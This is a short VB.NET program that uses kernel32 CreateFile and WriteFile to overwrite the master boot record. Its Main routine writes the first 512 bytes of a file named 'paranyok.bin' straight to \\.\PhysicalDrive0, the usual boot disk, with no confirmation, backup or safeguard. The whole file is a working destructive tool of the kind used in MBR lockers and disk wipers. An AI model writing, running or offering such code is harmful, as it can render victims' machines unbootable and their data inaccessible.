Imports System.IO
Imports System.Runtime.InteropServices

Module Module1

    ' Import CreateFile from Kernel32.dll for low-level disk access
    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Function CreateFile(
        ByVal lpFileName As String,
        ByVal dwDesiredAccess As UInteger,
        ByVal dwShareMode As UInteger,
        ByVal lpSecurityAttributes As IntPtr,
        ByVal dwCreationDisposition As UInteger,
        ByVal dwFlagsAndAttributes As UInteger,
        ByVal hTemplateFile As IntPtr) As IntPtr
    End Function

    ' Import WriteFile from Kernel32.dll for writing to the disk
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function WriteFile(
        ByVal hFile As IntPtr,
        ByVal lpBuffer As Byte(),
        ByVal nNumberOfBytesToWrite As UInteger,
        ByRef lpNumberOfBytesWritten As UInteger,
        ByVal lpOverlapped As IntPtr) As Boolean
    End Function

    ' Import CloseHandle from Kernel32.dll for closing disk handle
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function CloseHandle(ByVal hObject As IntPtr) As Boolean
    End Function

    Const GENERIC_WRITE As UInteger = &H40000000
    Const OPEN_EXISTING As UInteger = 3
    Const FILE_ATTRIBUTE_NORMAL As UInteger = &H80

    Sub WriteMBR(ByVal binFilePath As String, ByVal diskPath As String)
        ' Open the binary file for reading
        If Not File.Exists(binFilePath) Then
            Console.WriteLine("Error: Unable to find binary file {0}", binFilePath)
            Return
        End If

        Dim buffer(511) As Byte
        Using binFile As New FileStream(binFilePath, FileMode.Open, FileAccess.Read)
            If binFile.Length < 512 Then
                Console.WriteLine("Error: The binary file does not contain 512 bytes.")
                Return
            End If
            ' Read the first 512 bytes
            binFile.Read(buffer, 0, buffer.Length)
        End Using

        ' Open the disk for writing
        Dim disk As IntPtr = CreateFile(diskPath, GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero)
        If disk = IntPtr.Zero OrElse disk = New IntPtr(-1) Then
            Console.WriteLine("Error: Unable to open disk {0}. Error Code: {1}", diskPath, Marshal.GetLastWin32Error())
            Return
        End If

        ' Write the 512 bytes to the disk
        Dim bytesWritten As UInteger
        Dim success As Boolean = WriteFile(disk, buffer, CUInt(buffer.Length), bytesWritten, IntPtr.Zero)
        If Not success OrElse bytesWritten <> 512 Then
            Console.WriteLine("Error: Failed to write 512 bytes to disk {0}. Error Code: {1}", diskPath, Marshal.GetLastWin32Error())
        Else
            Console.WriteLine("MBR successfully written to {0}", diskPath)
        End If

        ' Close the disk handle
        CloseHandle(disk)
    End Sub

    Sub Main()
        ' Example: write the `paranyok.bin` file to `\\.\PhysicalDrive0`
        WriteMBR("paranyok.bin", "\\.\PhysicalDrive0")
    End Sub

End Module
